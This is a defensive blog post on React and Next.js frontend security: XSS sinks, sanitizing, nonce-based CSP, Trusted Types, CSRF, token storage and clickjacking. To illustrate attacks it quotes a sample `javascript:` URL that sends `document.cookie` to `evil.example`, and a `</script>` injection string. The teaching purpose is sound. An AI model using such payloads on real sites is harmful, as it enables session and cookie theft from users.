@@ -1,0 +1,460 @@
+---
+title: "Practical Frontend Security: XSS in React, Nonce-Based CSP, Trusted Types, CSRF and Clickjacking"
+excerpt: "React's escaping does a lot for you, but not everything. This post walks through the XSS holes React doesn't cover, building a strict nonce-based CSP in Next.js, Trusted Types, CSRF in the SameSite era, where to store tokens, and how to stop clickjacking."
+---
+
+<Lead>Many frontend teams I've worked with share an unspoken belief: "We use React, so XSS isn't our problem." That belief is about 90% right — and the remaining 10% is exactly where real incidents happen. This isn't a list of OWASP theory; it's what I actually check and configure when shipping a React/Next.js app to production: where XSS still gets through, how to build a nonce-based Content Security Policy, what Trusted Types buy you, how SameSite changed CSRF, and an honest look at where to store tokens.</Lead>
+
+## The threat model: what does the frontend protect?
+
+Before the techniques, it's worth being clear about what the frontend *can* and *cannot* do. Every check in the browser can be bypassed — attackers don't need your UI, they send requests straight to your API. Authorization, input validation and rate limiting always belong on the server.
+
+What the frontend is genuinely responsible for is **protecting legitimate users from being abused inside their own browser**:
+
+- **XSS (Cross-Site Scripting):** an attacker gets JavaScript running in your origin. From there they can do anything the user can — read data on the page, call your API with the user's session, rewrite the UI to phish for a password.
+- **CSRF (Cross-Site Request Forgery):** another site makes the user's browser send a request, with cookies attached, to your server — performing an action the user never intended.
+- **Clickjacking:** your page is loaded in a transparent `iframe`; the user thinks they're clicking the other site, but they're actually clicking your "Delete account" button.
+
+Of the three, XSS is the most dangerous because it defeats nearly every other defense — including CSRF tokens, since a script running in your origin can simply read them. So most of this post is about XSS.
+
+## Why React's escaping isn't enough
+
+By default React escapes every value you render as text. Write `<p>{comment}</p>` with a `comment` containing an `<img onerror=...>` tag and the user sees literal characters; nothing executes. That's why React is far safer than the jQuery era of concatenating HTML strings.
+
+But escaping only applies to **text nodes and attribute values that React manages**. There are "sinks" — places where data flows in and can become code — that React doesn't, or can't, protect:
+
+| Sink | Example | Why it's dangerous |
+| --- | --- | --- |
+| `dangerouslySetInnerHTML` | Rendering HTML from a CMS or markdown | The string goes straight into `innerHTML`, unescaped |
+| URLs in `href` / `src` | `href` taken from a user profile | A `javascript:` scheme runs code when clicked |
+| JSON embedded in `<script>` | Passing server state to the client | A `</script>` inside the data closes the tag early |
+| Direct DOM APIs | `ref.current.innerHTML`, `insertAdjacentHTML` | Bypasses React entirely |
+| Third-party libraries | Widgets, markdown renderers, editors | May use `innerHTML` internally |
+| Dynamic code | `eval`, `new Function`, `setTimeout` with a string | The string becomes code |
+
+### dangerouslySetInnerHTML and external HTML
+
+The name is the warning, but the need is real: articles from a CMS, emails shown inside an app, markdown typed by users. My rule is simple: **any HTML you didn't write yourself goes through a sanitizer before it touches the DOM**, and that sanitizer must be allow-list based, not block-list based.
+
+Block-lists (strip `<script>`, strip `onerror`...) always lose, because HTML has too many ways to run code: event handlers on all sorts of elements, SVG, `<iframe srcdoc>`, `<form>` with `formaction`, plus the transformations the HTML parser applies to malformed markup. An allow-list flips it around: keep only the tags and attributes you know are harmless and drop everything else. DOMPurify is the popular choice because it uses the browser's own parser, which avoids most of the gap between "what the sanitizer thinks" and "what the browser actually understands".
+
+```tsx
+import DOMPurify from "dompurify";
+
+const ALLOWED = {
+  ALLOWED_TAGS: ["p", "a", "strong", "em", "ul", "ol", "li", "code", "pre", "blockquote", "h2", "h3"],
+  ALLOWED_ATTR: ["href", "title"],
+  // Only http(s) and mailto in href — blocks javascript:, data:...
+  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
+};
+
+export function RichText({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, ALLOWED);
+  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+```
+
+A few things I've learned using sanitizers:
+
+- **Sanitize as close to rendering as possible.** Data that was "clean when it went into the database" stops being clean if you later change how it's rendered, or if some other write path skips the filter.
+- **Server-side needs a DOM.** DOMPurify needs `window`; when rendering on the server you need a build that ships with a simulated DOM (for example via jsdom), or sanitize on the client. Don't replace it with a hand-written regex.
+- **Keep it updated.** A sanitizer is security software — bypasses still get found and patched over time.
+
+<Callout>
+  **Markdown is not automatically safe.** Many markdown renderers let raw HTML through by default, and a link like `[click here](javascript:...)` is perfectly valid markdown. Disable raw HTML if you don't need it, and still sanitize the final HTML — don't treat your markdown library's config as the only line of defense.
+</Callout>
+
+### `javascript:` URLs in href
+
+This is the bug I find most often in code review, because it looks so harmless:
+
+```tsx
+// The user typed their own "website" into their profile
+<a href={user.website}>{user.name}'s website</a>
+```
+
+If `user.website` is `javascript:fetch('https://evil.example/?c='+document.cookie)`, React still puts it in `href` — escaping doesn't help because it's a valid attribute value. Recent React versions warn about or block `javascript:` URLs, but I don't count that as a defense: it doesn't cover every sink (URLs you pass to `window.location` or `window.open`, for instance), and the behavior has changed between versions. The right fix is an allow-list on the scheme:
+
+```ts
+const SAFE_PROTOCOLS = new Set(["http:", "https:", "mailto:"]);
+
+export function safeUrl(input: string, fallback = "#"): string {
+  try {
+    // A base URL lets relative paths resolve too
+    const url = new URL(input, window.location.origin);
+    return SAFE_PROTOCOLS.has(url.protocol) ? url.href : fallback;
+  } catch {
+    return fallback;
+  }
+}
+```
+
+Use `new URL()` instead of checking `startsWith("javascript:")`, because browsers accept many variants: uppercase, leading whitespace or control characters, tabs in the middle. The standard URL parser normalizes all of that before you check `protocol`.
+
+### Server-rendered JSON in script tags
+
+A familiar pattern: the server renders the page and embeds initial state in the HTML so the client can hydrate.
+
+```tsx
+// ❌ Dangerous
+<script
+  dangerouslySetInnerHTML={{
+    __html: `window.__INITIAL_STATE__ = ${JSON.stringify(state)}`,
+  }}
+/>
+```
+
+`JSON.stringify` produces valid JSON, but it does **not** escape `</script>`. If any field in `state` (a username, a post title) contains `</script><script>alert(1)</script>`, the HTML parser closes the script element right there — it doesn't care that you're in the middle of a JavaScript string — and what follows becomes a new script element. The fix is to escape `<` (and a few other special characters) as Unicode escapes:
+
+```ts
+export function serializeForScript(data: unknown): string {
+  return JSON.stringify(data)
+    .replace(/</g, "\\u003c")
+    .replace(/>/g, "\\u003e")
+    .replace(/&/g, "\\u0026")
+    .replace(/ /g, "\\u2028")
+    .replace(/ /g, "\\u2029");
+}
+```
+
+The output is still valid JSON/JavaScript and parses to the same value, but the HTML parser no longer sees a closing tag. Even better is `<script type="application/json">` read with `JSON.parse(el.textContent)` — the data is never executed as code, though you still need to escape `<` to avoid closing the tag early. If you're on the Next.js App Router, the framework already handles serialization for Server Components; the risk lives in script tags you write yourself, like JSON-LD for SEO.
+
+## Content Security Policy: the second line of defense
+
+Sanitizing and validating is the first line — keeping payloads out. But sooner or later something slips through. **Content Security Policy (CSP)** is the second line: even if an attacker injects markup into your page, the browser refuses to run scripts you didn't authorize.
+
+### Why domain allow-lists don't work well
+
+Old-style CSP lists allowed domains: `script-src 'self' cdn.example.com www.google-analytics.com`. The problem is that big domains often host endpoints that can be abused — JSONP callbacks, old libraries with "script gadgets", user-uploaded files. One weak domain on the list and the policy is bypassed. The list also grows over time and nobody dares remove a line.
+
+The currently recommended approach is a **strict CSP** based on nonces:
+
+```http
+Content-Security-Policy:
+  script-src 'nonce-R4nd0mV4lu3' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  frame-ancestors 'none';
+```
+
+Piece by piece:
+
+- **`'nonce-...'`**: only script elements with a matching `nonce` attribute may run. The nonce is random **per response**, so an attacker who injects a `<script>` can't guess it.
+- **`'strict-dynamic'`**: a script trusted via its nonce may load further scripts programmatically, e.g. via `document.createElement("script")`. That keeps bundlers, code splitting and tag managers working without listing domains. In browsers that support `'strict-dynamic'`, host allow-lists and `'self'` in `script-src` are ignored.
+- **`https:` and `'unsafe-inline'`**: fallbacks only, for old browsers that don't understand nonces or `'strict-dynamic'`. Modern browsers ignore `'unsafe-inline'` when a nonce is present, so it doesn't weaken the policy there.
+- **`object-src 'none'`**: blocks `<object>`/`<embed>` plugins, an old code-execution path.
+- **`base-uri 'none'`**: blocks an injected `<base>` element from re-rooting every relative URL — including the URLs of your legitimate scripts.
+
+<Callout>
+  **Nonces don't allow inline event handlers — and that's a good thing.** HTML attributes like `onclick="..."` are blocked under a strict CSP because there's no way to attach a nonce to them. React's `onClick` is unaffected since React attaches listeners from JavaScript rather than emitting HTML attributes. What usually breaks is legacy code, old libraries or marketing snippets.
+</Callout>
+
+### Generating a per-request nonce in Next.js
+
+Next.js supports nonces well: if the incoming request carries a CSP header containing a nonce, the framework applies that nonce to the script tags it generates. Your job is to create the nonce in the proxy (since Next.js 16, `middleware.ts` was renamed to `proxy.ts`; older versions use `middleware.ts` exporting a `middleware` function).
+
+```ts
+// proxy.ts
+import { NextResponse, type NextRequest } from "next/server";
+
+export function proxy(request: NextRequest) {
+  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
+  const isDev = process.env.NODE_ENV === "development";
+
+  const csp = [
+    `default-src 'self'`,
+    // React in dev mode needs eval for debugging; production doesn't
+    `script-src 'nonce-${nonce}' 'strict-dynamic' https: 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
+    `style-src 'self' 'unsafe-inline'`,
+    `img-src 'self' blob: data: https:`,
+    `font-src 'self'`,
+    `connect-src 'self'`,
+    `object-src 'none'`,
+    `base-uri 'none'`,
+    `form-action 'self'`,
+    `frame-ancestors 'none'`,
+    `upgrade-insecure-requests`,
+  ].join("; ");
+
+  // Put the CSP on the request so Next.js can read the nonce while rendering
+  const requestHeaders = new Headers(request.headers);
+  requestHeaders.set("x-nonce", nonce);
+  requestHeaders.set("Content-Security-Policy", csp);
+
+  const response = NextResponse.next({ request: { headers: requestHeaders } });
+  // ...and on the response so the browser enforces it
+  response.headers.set("Content-Security-Policy", csp);
+  return response;
+}
+
+export const config = {
+  matcher: [
+    {
+      source: "/((?!api|_next/static|_next/image|favicon.ico).*)",
+      // Skip prefetch requests — they don't need their own CSP
+      missing: [
+        { type: "header", key: "next-router-prefetch" },
+        { type: "header", key: "purpose", value: "prefetch" },
+      ],
+    },
+  ],
+};
+```
+
+When you need the nonce for scripts you add yourself (analytics, JSON-LD), read it in a Server Component:
+
+```tsx
+// app/layout.tsx
+import { headers } from "next/headers";
+import Script from "next/script";
+
+export default async function RootLayout({ children }: { children: React.ReactNode }) {
+  const nonce = (await headers()).get("x-nonce") ?? undefined;
+
+  return (
+    <html lang="en">
+      <body>
+        {children}
+        <Script src="https://analytics.example.com/a.js" strategy="afterInteractive" nonce={nonce} />
+      </body>
+    </html>
+  );
+}
+```
+
+Three practical notes:
+
+1. **Nonces force dynamic rendering.** Each response has a different nonce, so the HTML can't be prebuilt statically or cached on a CDN the way it used to be. For a purely static blog or marketing page, that's a real trade-off — consider a hash-based CSP, or accept a looser policy on pages with no user data.
+2. **Nonces must be truly random and never reused.** Use Web Crypto, not `Math.random()`, and never cache a response containing a nonce and serve it to someone else.
+3. **`style-src 'unsafe-inline'` is a compromise.** Many CSS-in-JS libraries, and React's inline styles, need it. Injected CSS is much less dangerous than injected script, so I accept it at first and tighten later if the stack allows.
+
+### Roll out with Report-Only, don't flip it on
+
+Turning a strict CSP straight on in production will almost certainly break something: a support chat snippet, an A/B testing script, some internal tool. My process:
+
+1. **Send `Content-Security-Policy-Report-Only`** with exactly the policy you intend to use. The browser blocks nothing; it only reports what *would* have been blocked.
+2. **Collect reports** on a dedicated endpoint for at least one release cycle — long enough to hit the rare flows.
+3. **Triage violations:** which are your code to fix, which are third-party scripts that need a nonce, which are noise.
+4. **Switch to `Content-Security-Policy`** once reports are clean, and keep reporting on to catch regressions.
+
+```http
+Reporting-Endpoints: csp="https://example.com/api/csp-report"
+Content-Security-Policy-Report-Only: script-src 'nonce-R4nd0mV4lu3' 'strict-dynamic'; object-src 'none'; base-uri 'none'; report-to csp; report-uri https://example.com/api/csp-report
+```
+
+`report-to` is the newer mechanism built on the Reporting API; `report-uri` is deprecated but still more widely supported, so I declare both. You can also send an enforced policy that works today alongside a stricter report-only one — the two headers are independent.
+
+<Callout>
+  **CSP reports are noisy.** Browser extensions, antivirus software injecting scripts, old browsers… they produce lots of violations that have nothing to do with your code. Group by `blocked-uri` and `violated-directive`, filter out schemes like `chrome-extension:`, and rate-limit the endpoint — it's a public URL and anyone can post junk to it.
+</Callout>
+
+## Trusted Types: stopping DOM XSS at the sink
+
+A nonce-based CSP controls *which scripts load*, but it can't stop your own legitimate code from feeding a malicious string into `innerHTML`. That's DOM XSS — data flowing from the URL, `postMessage` or an API into a dangerous sink, without the server reflecting anything special.
+
+**Trusted Types** targets exactly that. When enforced, dangerous sinks like `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval` and `script.src` **reject plain strings** and only accept `TrustedHTML`, `TrustedScript` and `TrustedScriptURL` objects. Those objects can only be created through *policies* you define:
+
+```http
+Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-html dompurify
+```
+
+- `require-trusted-types-for 'script'` turns enforcement on.
+- `trusted-types` restricts which policy names may be created — so a random library can't create its own policy that blesses everything.
+
+```ts
+import DOMPurify from "dompurify";
+
+// Feature-detect: not every browser has trustedTypes
+const appHtmlPolicy =
+  typeof window !== "undefined" && window.trustedTypes
+    ? window.trustedTypes.createPolicy("app-html", {
+        createHTML: (input: string) => DOMPurify.sanitize(input),
+      })
+    : null;
+
+export function setSafeHtml(el: HTMLElement, html: string) {
+  // With Trusted Types enforced, assigning a raw string to innerHTML throws;
+  // only objects created by a policy are accepted.
+  el.innerHTML = (appHtmlPolicy?.createHTML(html) ?? DOMPurify.sanitize(html)) as string;
+}
+```
+
+The real value of Trusted Types is that it **changes the review problem**: instead of auditing every place in the codebase that might touch `innerHTML`, you review a handful of policies. Every other path into a sink throws at runtime, with a report if you've enabled reporting.
+
+Rolling it out in practice:
+
+- **Browser support:** Trusted Types has been in Chromium-based browsers for a long time; other engines have been adding it. Check current support data before you decide. Browsers without support simply ignore the directive, so it's an additional layer that doesn't break anything.
+- **Start in report-only**, just like CSP. You'll be surprised how many libraries still assign strings to `innerHTML`.
+- **A policy named `default`** is a migration escape hatch: it's invoked automatically when a raw string reaches a sink. Handy, but if it just returns its input unchanged you've switched off the whole protection. Use it temporarily, with sanitizing and logging.
+
+## CSRF in the SameSite era
+
+CSRF exploits a basic browser behavior: cookies are attached to requests sent to your domain regardless of which page initiated them. A hidden form on `evil.example` auto-submits `POST /transfer` to your bank — the session cookie rides along and the server sees a valid request.
+
+### SameSite changes the picture
+
+The `SameSite` attribute lets the server tell the browser when a cookie may be sent on cross-site requests:
+
+| Value | Cookie is sent on | Notes |
+| --- | --- | --- |
+| `Strict` | Same-site requests only | Safest, but following a link from an email lands you looking logged out |
+| `Lax` | Same-site, plus top-level navigations with a "safe" method like `GET` | Blocks cross-site form `POST`s, `fetch`, `iframe`s, images |
+| `None` | Every request (requires `Secure`) | Needed for cookies used inside cross-site embedded iframes |
+
+Chrome treats cookies without a `SameSite` attribute as `Lax`, but not every browser applies that default the same way. The lesson: **always set `SameSite` explicitly** and don't rely on defaults.
+
+```http
+Set-Cookie: __Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
+```
+
+The `__Host-` prefix requires the cookie to be `Secure`, have `Path=/` and no `Domain` — meaning it belongs to exactly that host and sibling subdomains can't overwrite it. Cheap and effective.
+
+### When you still need CSRF tokens
+
+With `SameSite=Lax`, most classic CSRF is blocked. But some cases remain:
+
+- **`GET` requests with side effects.** `Lax` still sends cookies on top-level `GET` navigations. If `GET /logout` or `GET /api/delete?id=1` changes data, you're still exposed. The root fix: `GET` must never change state.
+- **"Same-site" is not "same-origin".** A site is defined by the registrable domain (eTLD+1), so `blog.example.com` and `app.example.com` are same-site. A subdomain with an XSS bug, or one that's been taken over (say, via a DNS record pointing at a deprovisioned service), can send requests carrying even `SameSite=Strict` cookies to your main app.
+- **Cookies that must be `SameSite=None`** — an app running inside a third-party iframe, certain SSO flows.
+- **Old browsers** that don't understand SameSite.
+- **Login CSRF:** the attacker logs the user into *the attacker's* account, then waits for them to enter card details.
+
+For these, add another layer:
+
+- **Synchronizer token / double-submit cookie:** the server issues a random token, the client sends it back in a header or the body, the server compares. Other sites can't read the token, so they can't forge it.
+- **Check the `Origin` (or `Sec-Fetch-Site`) header** on state-changing requests. Modern browsers send these headers and JavaScript on another site can't fake them. It's simple and effective, especially for APIs.
+
+```ts
+// A simple check for data-mutating routes
+export function assertSameOrigin(req: Request) {
+  const site = req.headers.get("sec-fetch-site");
+  if (site && site !== "same-origin" && site !== "none") {
+    throw new Response("Forbidden", { status: 403 });
+  }
+  const origin = req.headers.get("origin");
+  if (origin && origin !== process.env.APP_ORIGIN) {
+    throw new Response("Forbidden", { status: 403 });
+  }
+}
+```
+
+If you use Next.js Server Actions, the framework only allows `POST` and compares `Origin` against the request's host — a built-in layer. Route Handlers (`app/api/.../route.ts`) don't get that; you have to do it yourself.
+
+### CORS is not CSRF protection
+
+This is the most common misconception I run into: "Our API has strict CORS, only our own origin is allowed, so CSRF isn't a concern." Wrong.
+
+CORS controls whether **another page can read the response**, not whether **the request gets sent**. A "simple request" — a form `POST` with a `Content-Type` of `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain` — goes straight to the server without a preflight. The server processes it, the money moves, and only then does the browser stop the other page from reading the result. The damage is done.
+
+Requiring `Content-Type: application/json` or a custom header *does* force a preflight, and that's a real mitigation. But it's fragile: one endpoint that also happens to accept form data, or a CORS config that reflects any `Origin` with credentials, is enough to reopen the hole. Treat it as secondary, not primary.
+
+<Callout>
+  **No CSRF defense survives XSS.** A script running in your origin sends same-origin requests, reads the CSRF token from the page and has all the cookies. That's why I always prioritize XSS: CSRF tokens only mean something once XSS is under control.
+</Callout>
+
+## Where to store tokens: httpOnly cookie vs localStorage
+
+This one is contentious because both camps are partly right. Here's the honest picture:
+
+| | `httpOnly` cookie | `localStorage` / `sessionStorage` | JS memory (a variable) |
+| --- | --- | --- | --- |
+| **Can XSS steal the token?** | No | Yes — one line of code | Harder, but a script on the same page can still hook into your code |
+| **Can XSS use the session?** | Yes, while the page is open | Yes | Yes |
+| **Exposed to CSRF?** | Yes — needs SameSite and/or tokens | No, the token isn't sent automatically | No |
+| **Survives reload?** | Yes | Yes | No — needs a refresh mechanism |
+| **Cross-domain APIs** | Complicated (CORS credentials, SameSite) | Easy | Easy |
+
+The key point: **httpOnly does not stop XSS from doing damage**. The attacker can't extract the token, but they can still send requests as the user for as long as the tab is open. What httpOnly buys you is **a limit on the duration and scope of the damage**: no token gets exfiltrated to be used from another machine, days later, or sold on. For long-lived tokens, that's a huge difference.
+
+My default for most web apps:
+
+- **Session or refresh token in a `__Host-`, `HttpOnly`, `Secure`, `SameSite=Lax` cookie** (or `Strict` if the UX allows), plus an `Origin` check on state-changing requests.
+- **If you need an access token for a third-party API**, keep it in memory, short-lived, renewed via the refresh cookie. Better still: use a backend-for-frontend (BFF) so the token never reaches the browser.
+- **Avoid long-lived tokens in `localStorage`.** Not because localStorage is "insecure" in some absolute sense, but because it turns every small XSS into a long-lasting credential leak.
+
+## Clickjacking and frame-ancestors
+
+Clickjacking doesn't require running code in your page. The attacker loads your page in a transparent `iframe` and positions it over an enticing "Claim your prize" button. The user clicks the prize, but the click actually lands on your "Confirm" button — with a full session, since cookies are still attached (unless SameSite blocks them in a cross-site iframe, which is a useful secondary layer).
+
+The defense is telling the browser who may embed your page:
+
+```http
+Content-Security-Policy: frame-ancestors 'none'
+X-Frame-Options: DENY
+```
+
+- **`frame-ancestors 'none'`** — nobody may embed it. Use `'self'` if your own app needs to iframe its pages, or list specific origins for partners.
+- **`X-Frame-Options`** is the older header, with only `DENY` and `SAMEORIGIN` (`ALLOW-FROM` is obsolete). When both are present, modern browsers prefer `frame-ancestors`; I still send `X-Frame-Options` for old browsers since it costs nothing.
+- **`frame-ancestors` doesn't work in a `<meta>` tag** — it must be sent as an HTTP header. This is a common mistake on static sites that configure CSP only via a meta tag.
+
+Don't rely on JavaScript "frame-busting" like checking `window.top !== window.self` as your main defense — the embedding page can neutralize it with the iframe's `sandbox` attribute.
+
+In Next.js, the simplest place for static headers is `next.config.ts`:
+
+```ts
+// next.config.ts
+import type { NextConfig } from "next";
+
+const securityHeaders = [
+  { key: "X-Frame-Options", value: "DENY" },
+  { key: "X-Content-Type-Options", value: "nosniff" },
+  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
+  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
+];
+
+const nextConfig: NextConfig = {
+  async headers() {
+    return [{ source: "/:path*", headers: securityHeaders }];
+  },
+};
+
+export default nextConfig;
+```
+
+The nonce-based CSP stays in the proxy because it has to be generated per request. Be careful with `preload` in HSTS: it's very hard to undo quickly, so only enable it once every subdomain is reliably on HTTPS.
+
+## A security checklist for a frontend PR
+
+This is the list I actually use in review. Not every item applies to every PR — just the ones relevant to the change.
+
+**Rendering data**
+
+- Is there a new `dangerouslySetInnerHTML`, `innerHTML` or `insertAdjacentHTML`? If so, does the data go through an allow-list sanitizer, and where?
+- Do user- or API-provided URLs flow into `href`, `src`, `window.location` or `window.open`? Is the scheme validated?
+- Is data embedded in a `<script>` tag (initial state, JSON-LD)? Is `<` escaped?
+- Any `eval`, `new Function`, or `setTimeout` with a string argument?
+
+**Libraries and third-party scripts**
+
+- Does a new library render HTML itself (markdown, rich text, charts with HTML tooltips)? Are its defaults safe?
+- Does a new third-party script need to be added to the CSP? Does it really need to run on every page, including checkout or account settings?
+
+**Cookies, auth and requests**
+
+- Does a new route or endpoint change state via `GET`?
+- Do data-mutating Route Handlers check `Origin`/`Sec-Fetch-Site` or a CSRF token?
+- Do new cookies have `HttpOnly`, `Secure` and an explicit `SameSite`? Is any token being stored in `localStorage`?
+- Is sensitive data being logged to the console, sent to analytics, or placed in URLs (where it leaks into history and the `Referer` header)?
+
+**Headers**
+
+- Does the change loosen the CSP (adding `'unsafe-inline'`, `'unsafe-eval'`, wildcards)? If so, is the reason documented?
+- Does a new page need to be embeddable in an iframe? If not, is `frame-ancestors` still applied?
+
+<Callout>
+  **Automate the boring parts.** An ESLint rule banning `dangerouslySetInnerHTML` (with per-line disables that require an explanatory comment), a test asserting the CSP header on responses, and an alert when CSP reports spike — these three catch more bugs than any checklist that depends on a reviewer's memory.
+</Callout>
+
+## Key takeaways
+
+<Checklist>
+
+- React escapes text and attributes, but doesn't protect `dangerouslySetInnerHTML`, `javascript:` URLs, JSON inside script tags, or direct DOM APIs.
+- External HTML goes through an allow-list sanitizer like DOMPurify, as close to rendering as possible; URLs get their scheme validated with `new URL()`.
+- Use a strict CSP with a per-request nonce and `'strict-dynamic'`, roll it out via Report-Only first, and keep reporting after you enforce.
+- Trusted Types turn every dangerous DOM sink into something that only accepts objects from policies you control — review a few policies instead of the whole codebase.
+- `SameSite=Lax` blocks most CSRF, but you still need an `Origin` check or tokens for subdomains, side-effecting `GET`s and `SameSite=None` cookies. CORS is not CSRF protection.
+- An httpOnly cookie doesn't stop XSS from riding the session, but it does stop the token from being stolen — and that difference matters.
+- Stop clickjacking with `frame-ancestors` sent as an HTTP header, plus `X-Frame-Options` for older browsers.
+
+</Checklist>
